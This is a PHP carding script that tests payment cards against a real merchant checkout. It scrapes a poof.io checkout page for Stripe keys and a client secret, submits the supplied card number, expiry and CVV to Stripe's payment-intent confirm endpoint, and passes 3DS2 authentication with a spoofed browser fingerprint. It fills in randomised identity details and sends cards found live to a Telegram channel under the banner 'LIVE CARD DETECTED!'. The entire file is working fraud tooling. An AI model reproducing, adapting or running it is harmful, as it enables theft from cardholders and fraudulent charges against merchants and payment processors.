<?php
include 'func.php';
error_reporting(0);
set_time_limit(0);
date_default_timezone_set('Asia/Manila');

function multiexplode($delimiters, $string) {
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

$pklive = $_GET['pklive'];
$cslive = $_GET['cslive'];
$xemail = $_GET['xemail'] ?? '';
//echo "login-credential: " . $sk . "<br>";

$lista = $_GET['cards'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

$bin_data = get_bin_info($cc);
$info = $bin_data['info'];
$issuer = $bin_data['issuer'];
$country_card = $bin_data['country_card'];
////////////////////////////===[Randomizing Details]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

////////////////////////////===[Function start]

function sendRequest($url, $headers, $payload) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payload));
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

//---------------------------------------------------------------------------------------------
// Initialize cURL session
$ch = curl_init();

// Set cURL options
curl_setopt($ch, CURLOPT_URL, "https://api.ipify.org/"); // API URL
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); // Return response as a string
curl_setopt($ch, CURLOPT_HTTPGET, true); // Use GET method
#curl_setopt($ch, CURLOPT_PROXY, $proxylocate); // Set proxy location
#curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxylogins); // Set proxy username and password

// Set custom request headers
$headers = [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Encoding: gzip, deflate, br, zstd",
    "Accept-Language: en-US,en;q=0.9",
    "Cache-Control: max-age=0",
    "Priority: u=0, i",
    "Sec-CH-UA: \"Google Chrome\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
    "Sec-CH-UA-Mobile: ?0",
    "Sec-CH-UA-Platform: \"Windows\"",
    "Sec-Fetch-Dest: document",
    "Sec-Fetch-Mode: navigate",
    "Sec-Fetch-Site: none",
    "Sec-Fetch-User: ?1",
    "Upgrade-Insecure-Requests: 1",
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
];
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

// Execute cURL session and store the response
$response = curl_exec($ch);

// Output the result
//echo "Captured IP address: " . $response;

// Optionally store it in a variable or log it
$captured_ip = $response;

////////////////////////////===[Start of inbuilt]
// Define the URL
$user_url = "https://www.poof.io/checkout/session/eyJmaWVsZHMiOlsiRW1haWwiXSwiZGVmYXVsdCI6eyJuYW1lIjoiZXJldCAiLCJlbWFpbCI6ImFzZGFzQGdtYWlsLmNvbSJ9LCJtZXRhZGF0YSI6eyJ1c2VyIjoiZXJldCAiLCJvcmRlcl9pZCI6NzE2Mn0sInVzZXJuYW1lIjoiZGdnb29kcyIsImFtb3VudCI6IjkuMDAiLCJzdWNjZXNzX3VybCI6Imh0dHBzOlwvXC9kaWdpdG9pZC5uZXRcL2NoZWNrb3V0XC9vcmRlci1yZWNlaXZlZFwvNzE2MlwvP2tleT13Y19vcmRlcl95Z2lPZ2NUYWNUaTMzIiwicmVkaXJlY3QiOiJodHRwczpcL1wvZGlnaXRvaWQubmV0XC9jaGVja291dFwvb3JkZXItcmVjZWl2ZWRcLzcxNjJcLz9rZXk9d2Nfb3JkZXJfeWdpT2djVGFjVGkzMyIsImluc3RhbnRfcGF5bWVudF9ub3RpZmljYXRpb24iOiJodHRwczpcL1wvZGlnaXRvaWQubmV0XC93Yy1hcGlcL3Bvb2YiLCJwcm9kdWN0X3F1YW50aXR5IjoxfQ==";
#echo $user_url;
// Replace with actual URL

// Define the request headers
$user_headers = [
    "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-encoding: gzip, deflate",
    "accept-language: en-US,en;q=0.9",
    "priority: u=0, i",
    'sec-ch-ua: "Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    "sec-ch-ua-mobile: ?0",
    'sec-ch-ua-platform: "Windows"',
    "sec-fetch-dest: document",
    "sec-fetch-mode: navigate",
    "sec-fetch-site: none",
    "sec-fetch-user: ?1",
    "upgrade-insecure-requests: 1",
    "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
];

// Initialize cURL
$ch = curl_init($user_url);
// Set cURL options
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); // Get the response as a string
curl_setopt($ch, CURLOPT_HTTPHEADER, $user_headers); // Set the headers
curl_setopt($ch, CURLOPT_ENCODING, ''); // Handle all encodings
#curl_setopt($ch, CURLOPT_PROXY, $proxylocate); // Optional: Proxy location
#curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxylogins); // Optional: Proxy username and password

// Execute the request
$user_response = curl_exec($ch);
/*if ($user_response === false) {
    echo "cURL Error: " . curl_error($ch);
} else {
    echo "Response: " . $user_response;
}*/
preg_match('/data-secret="([^"]+)"/', $user_response, $pi_secret);
$csecret = $pi_secret[1];
$cintent = substr($csecret, 0,27);
preg_match('/<div class="price shimmer5">(\$[\d,\.]+)/', $user_response, $price);
$price_value = $price[1];
preg_match('/Stripe\(\'(pk_live_[^,]+)\'/', $user_response, $pk_live);
$pklive = $pk_live[1];
preg_match('/stripeAccount:\s*[\'"]([^\'"]+)[\'"]/', $user_response, $stripe_account);
$stripe_acc = $stripe_account[1];
#echo '<span class="text text-success">user_response:</span> <span class="text text-danger">'.$user_response.'</span><br>';
#echo '<span class="text text-success">pi_secret_value:</span> <span class="text text-danger">'.$csecret.'</span><br>';
#echo '<span class="text text-success">cintent:</span> <span class="text text-danger">'.$cintent.'</span><br>';
#echo '<span class="text text-success">pk_live_value 1:</span> <span class="text text-danger">'.$pklive.'</span><br>';
#echo '<span class="text text-success">stripe_acc:</span> <span class="text text-danger">'.$stripe_acc.'</span><br>';
#echo '<span class="text text-success">price_value:</span> <span class="text text-danger">'.$price_value.'</span><br>';
#print_r($response3);

// Corrected URL with formatted cintent value
$pay_url = "https://api.stripe.com/v1/payment_intents/{$cintent}/confirm";

// Define the headers for the second request (Stripe API request)
$pay_headers = [
    "Accept: application/json",
    "Accept-Encoding: gzip, deflate, br, zstd",
    "Accept-Language: en-US,en;q=0.9",
    "Content-Type: application/x-www-form-urlencoded",
    "Origin: https://js.stripe.com",
    "Priority: u=1, i",
    "Referer: https://js.stripe.com/",
    "Sec-CH-UA: \"Google Chrome\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
    "Sec-CH-UA-Mobile: ?0",
    "Sec-CH-UA-Platform: \"Windows\"",
    "Sec-Fetch-Dest: empty",
    "Sec-Fetch-Mode: cors",
    "Sec-Fetch-Site: same-site",
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
];

// Define the payload for the second request
$pay_data = [
    'payment_method_data[type]' => 'card',
    'payment_method_data[card][number]' => $cc,
    'payment_method_data[card][cvc]' => $cvv,
    'payment_method_data[card][exp_year]' => $ano,
    'payment_method_data[card][exp_month]' => $mes,
    'payment_method_data[allow_redisplay]' => 'unspecified',
    'payment_method_data[billing_details][address][country]' => 'PH',
    'payment_method_data[referrer]' => 'https://www.poof.io',
    'payment_method_data[client_attribution_metadata][merchant_integration_source]' => 'elements',
    'payment_method_data[client_attribution_metadata][merchant_integration_subtype]' => 'payment-element',
    'payment_method_data[client_attribution_metadata][merchant_integration_version]' => '2021',
    'payment_method_data[client_attribution_metadata][payment_intent_creation_flow]' => 'standard',
    'payment_method_data[client_attribution_metadata][payment_method_selection_flow]' => 'merchant_specified',
    'expected_payment_method_type' => 'card',
    'use_stripe_sdk' => 'true',
    'key' => $pklive,
    '_stripe_account' => $stripe_acc,
    'client_secret' => $csecret
];

// cURL request for Stripe API
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $pay_url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($pay_data)); // Sending the data in URL encoded format
curl_setopt($ch, CURLOPT_HTTPHEADER, $pay_headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Optional: Set proxy if needed
#curl_setopt($ch, CURLOPT_PROXY, $proxylocate); // Set proxy location (if required)
#curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxylogins); // Set proxy username and password (if required)

// Execute the cURL request and capture the response
$pay_response = curl_exec($ch);

// Parse the JSON response
$response_json = json_decode($pay_response, true);

// Extract status and message (error handling)
$status = $response_json['error']['payment_intent']['status'] ?? null;
$status = $response_json['status'] ?? null;
$message = $response_json['error']['message'] ?? null;
$decline_code = $response_json['error']['decline_code'] ?? null;
$code = $response_json['error']['code'] ?? null;
$default = htmlentities($pay_response);  // Use the original response as a fallback
#echo "Status: " . $status . "<br>";
#echo "Message: " . $message . "<br>";
#echo "Decline Code: " . $decline_code . "<br>";
#echo "Code: " . $code . "<br>";
#echo "default: $default\n";
if ($status === 'requires_action') {

            $server_transaction_id = base64_encode(json_encode(["threeDSServerTransID" => $response_json['next_action']['use_stripe_sdk']['server_transaction_id'] ?? null]));
            $three_d_secure_2_source = $response_json['next_action']['use_stripe_sdk']['three_d_secure_2_source'] ?? null;

            // Prepare the URL for 3DS2 authentication
            $auth_url = "https://api.stripe.com/v1/3ds2/authenticate";

            // Set the headers for the 3DS2 authentication request
            $auth_headers = [
                "accept: application/json",
                "accept-encoding: gzip, deflate, br, zstd",
                "accept-language: en-US,en;q=0.9",
                "content-type: application/x-www-form-urlencoded",
                "origin: https://js.stripe.com",
                "referer: https://js.stripe.com/",
                "sec-ch-ua: \"Google Chrome\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
                "sec-ch-ua-mobile: ?0",
                "sec-ch-ua-platform: \"Windows\"",
                "sec-fetch-dest: empty",
                "sec-fetch-mode: cors",
                "sec-fetch-site: same-site",
                "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
            ];

            // Prepare the payload for 3DS2 authentication
            $auth_payload = [
                "source" => $three_d_secure_2_source,
                "browser" => json_encode([
                    "fingerprintAttempted" => false,
                    "fingerprintData" => $server_transaction_id,
                    "challengeWindowSize" => null,
                    "threeDSCompInd" => "Y",
                    "browserJavaEnabled" => false,
                    "browserJavascriptEnabled" => true,
                    "browserLanguage" => "en-US",
                    "browserColorDepth" => "24",
                    "browserScreenHeight" => "768",
                    "browserScreenWidth" => "1366",
                    "browserTZ" => "-480",
                    "browserUserAgent" => "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36"
                ]),
                "one_click_authn_device_support[hosted]" => "false",
                "one_click_authn_device_support[same_origin_frame]" => "false",
                "one_click_authn_device_support[spc_eligible]" => "false",
                "one_click_authn_device_support[webauthn_eligible]" => "false",
                "one_click_authn_device_support[publickey_credentials_get_allowed]" => "true",
                "key" => $pklive,
                "_stripe_account" => $stripe_acc
            ];


            // Send the POST request for 3DS2 authentication
            curl_setopt($ch, CURLOPT_URL, $auth_url);
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($auth_payload));
            curl_setopt($ch, CURLOPT_HTTPHEADER, $auth_headers);
            curl_setopt($ch, CURLOPT_ENCODING, '');
            #curl_setopt($ch, CURLOPT_PROXY, $proxylocate); // Proxy location
            #curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxylogins); // Proxy username and password

            // Get the response from the 3DS2 authentication
            $auth_response = curl_exec($ch);

            $state = $status = json_decode($auth_response)->state ?? json_decode($auth_response)->status ?? null;
            $default = htmlentities($auth_response);

            if (($state == "succeeded") || ($state == "attempted") || ($state == "processing_error")){

                $get_url = "https://api.stripe.com/v1/payment_intents/{$cintent}?is_stripe_sdk=false&client_secret={$csecret}&key={$pklive}&_stripe_account={$stripe_acc}";

                // Set the headers for the GET request
                $get_headers = [
                    "accept: application/json",
                    "accept-encoding: gzip, deflate, br, zstd",
                    "accept-language: en-US,en;q=0.9",
                    "content-type: application/x-www-form-urlencoded",
                    "origin: https://js.stripe.com",
                    "referer: https://js.stripe.com/",
                    "sec-ch-ua: \"Google Chrome\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
                    "sec-ch-ua-mobile: ?0",
                    "sec-ch-ua-platform: \"Windows\"",
                    "sec-fetch-dest: empty",
                    "sec-fetch-mode: cors",
                    "sec-fetch-site: same-site",
                    "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
                ];

                // Initialize cURL
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $get_url);
                curl_setopt($ch, CURLOPT_HTTPHEADER, $get_headers);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_ENCODING, '');
                #curl_setopt($ch, CURLOPT_PROXY, $proxylocate); // Proxy location
                #curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxylogins); // Proxy username and password

                // Execute the GET request
                $get_response = curl_exec($ch);

                $get_response_decoded = json_decode($get_response);

                $status = $get_response_decoded->status;
                $message = $get_response_decoded->last_payment_error->decline_code ?? $get_response_decoded->last_payment_error->code;
                $default = htmlentities($get_response);

                if($status == "succeeded"){
                    echo '<span class="text text-success">Charge</span> <span class="text text-success">'.$lista.'</span> ➔ <span class="text text-success">Your payment of '.$price_value.' was approved!</span><br>';
                    $message = "🔊<b>LIVE CARD DETECTED!</b>\n" .
                    "✉️ <b>CARD:</b> $lista\n" .
                    "🔍 <b>STATUS:</b> Your payment of '.$price_value.' was approved! (CVV)\n\n" .
                    "ℹ️ <b>🧾 Payment Details</b>\n" .
                    "ℹ️ <b>Info:</b> $info\n" .
                    "🏦 <b>Issuer:</b> $issuer\n" .
                    "🌍 <b>Country:</b> $country_card\n" .
                    "🌐 <b>CREATED BY:</b> I AM ATOMIC LANG MALAKAS!";
                    sendToTelegram($message,$telegram);
                }elseif($message == "incorrect_cvc"){
                    echo '<span class="text text-warning">Live</span> <span class="text text-warning">'.$lista.'</span> ➔ <span class="text text-warning">'.$message.' (3DS verification: YES)</span><br>';
                    $message = "🔊<b>LIVE CARD DETECTED!</b>\n" .
                    "✉️ <b>CARD:</b> $lista\n" .
                    "🔍 <b>STATUS:</b> incorrect_cvc (CCN)\n\n" .
                    "ℹ️ <b>🧾 Payment Details</b>\n" .
                    "ℹ️ <b>Info:</b> $info\n" .
                    "🏦 <b>Issuer:</b> $issuer\n" .
                    "🌍 <b>Country:</b> $country_card\n" .
                    "🌐 <b>CREATED BY:</b> I AM ATOMIC LANG MALAKAS!";
                    sendToTelegram($message,$telegram);
                }else{
                    echo '<span class="text text-danger">Decline</span> <span class="text text-danger">➔ '.$lista.' ➔ '.$message.' ('.$state.')</span><br>';
                }
                }else{
                    echo '<span class="text text-danger">Decline</span> <span class="text text-danger">➔ '.$lista.' ➔ '.$state.'</span><br>';
                }
                }else{
                    // Check the status of the payment intent
                    if (isset($response_json['status']) && $response_json['status'] == 'succeeded') {
                        echo '<span class="text text-success">Charge</span> <span class="text text-success">'.$lista.'</span> ➔ <span class="text text-success">Your payment of '.$price_value.' was approved!<br>';
                        $message = "🔊<b>LIVE CARD DETECTED!</b>\n" .
                        "✉️ <b>CARD:</b> $lista\n" .
                        "🔍 <b>STATUS:</b> Your payment of '.$price_value.' was approved! (CVV)\n\n" .
                        "ℹ️ <b>🧾 Payment Details</b>\n" .
                        "ℹ️ <b>Info:</b> $info\n" .
                        "🏦 <b>Issuer:</b> $issuer\n" .
                        "🌍 <b>Country:</b> $country_card\n" .
                        "🌐 <b>CREATED BY:</b> I AM ATOMIC LANG MALAKAS!";
                        sendToTelegram($message,$telegram);
                    }elseif($decline_code == "incorrect_cvc"){
                        echo '<span class="text text-warning">Live</span> <span class="text text-warning">'.$lista.'</span> ➔ <span class="text text-warning">'.$message.'('.$decline_code.')</span><br>';
                        $message = "🔊<b>LIVE CARD DETECTED!</b>\n" .
                        "✉️ <b>CARD:</b> $lista\n" .
                        "🔍 <b>STATUS:</b> incorrect_cvc (CCN)\n\n" .
                        "ℹ️ <b>🧾 Payment Details</b>\n" .
                        "ℹ️ <b>Info:</b> $info\n" .
                        "🏦 <b>Issuer:</b> $issuer\n" .
                        "🌍 <b>Country:</b> $country_card\n" .
                        "🌐 <b>CREATED BY:</b> I AM ATOMIC LANG MALAKAS!";
                        sendToTelegram($message,$telegram); 
                    } elseif (isset($response_json['error'])) {
                        // Get the error details
                        $error_message = $response_json['error']['message'];
                        $decline_code = $response_json['error']['decline_code'];
                        echo '<span class="text text-danger">Declined</span> <span class="text text-danger">'.$lista.'</span> ➔ <span class="text text-danger">'.$error_message.' ('.$decline_code.')</span></span><br>';
                    } else {
                        echo '<span class="text text-danger">Declined</span> <span class="text text-danger">'.$lista.'</span> ➔ <span class="text text-danger">Message: Unknown error or response.</span><br>';
                    }
                        }
////////////////////////////===[Responses]


ob_flush();

?>